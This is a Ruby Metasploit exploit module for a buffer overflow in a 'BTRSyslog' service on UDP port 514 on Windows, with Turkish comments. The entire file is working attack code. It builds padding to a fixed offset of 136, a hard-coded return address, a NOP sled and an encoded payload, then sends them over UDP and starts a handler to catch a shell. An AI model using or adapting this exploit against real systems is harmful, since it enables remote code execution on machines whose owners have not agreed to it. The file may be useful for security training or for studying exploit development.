require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking                 
  include Exploit::Remote::Udp
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BTRSyslog Remote Exploit',
      'Description'    => %q{BTRSyslog Buffer Overflow},
      'License'        => MSF_LICENSE,
      'Author'         => ['Emre Karadeniz',],
      'References'     => [[ 'http://www.btrisk.com'],],
      'DefaultOptions' => {'EXITFUNC' => 'thread',},
      'Payload'        => {'BadChars' => "\x00",},
      'Platform' => 'win',
      'Targets'        => [
          ['Tum Windows Isletim Sistemleri',
            {
              'Ret'      => 0x5060103B,
              'Offset'   => 136
            }],
        ],
      'DisclosureDate' => 'October 29 2023',
      'DefaultTarget'  => 0))
	register_options([Opt::RPORT(514),], self.class)
  end

#Exploit isleminin tanimlandigi bolum
  def exploit
    connect_udp
    sploit = rand_text_alpha(target['Offset'], bad = payload_badchars)
    sploit << [target.ret].pack('V')
    sploit << make_nops(16)
    sploit << payload.encoded
    udp_sock.put(sploit)
    handler	
    disconnect_udp		
  end

end

